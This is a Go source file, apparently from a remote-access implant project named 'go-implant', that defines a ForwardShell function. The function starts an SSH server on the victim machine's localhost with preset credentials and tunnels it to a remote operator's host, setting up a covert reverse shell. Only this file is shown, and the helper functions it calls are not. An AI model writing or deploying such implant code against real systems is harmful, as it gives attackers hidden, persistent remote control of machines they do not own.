package ssh

import (
	"go-implant/client/config"
	"log"
)

// ForwardShell starts ssh server on localhost and redirects it to a remote host
func ForwardShell(channel chan struct{}, localsshport int, localsshusername string, localsshpassword string, remotesshusername string, remotesshpassword string, remotesshHost string, remotesshPort int, fromPort int) {

	// create new channel to indicate children to stop
	// does not get closed by children - this routine keeps running until channel gets closed
	newchan := make(chan struct{})

	// create new channel to pass port from ServeSSH to Forwardport
	portchan := make(chan int, 1)

	// start threads to serve ssh on local port
	go func() {
		ServeSSH(newchan, localsshport, localsshusername, localsshpassword, portchan)
	}()

	// forward local port to the tunnel
	go func() {
		// if tunnel is not up, open it
		thistunnel, err := CreateTunnel(newchan, remotesshusername, remotesshpassword, remotesshHost, remotesshPort)
		if err != nil {
			if config.DEBUG {
				log.Printf("Error opening tunnel (%s)", err)
			}
			return
		}

		// open new channel to the tunnel
		OpenChannel(newchan, thistunnel, "127.0.0.1", localsshport, portchan)

	}()

	<-channel      // wait for channel to be closed (meaning this ssh serving should stop)
	close(newchan) // tell children to stop
}
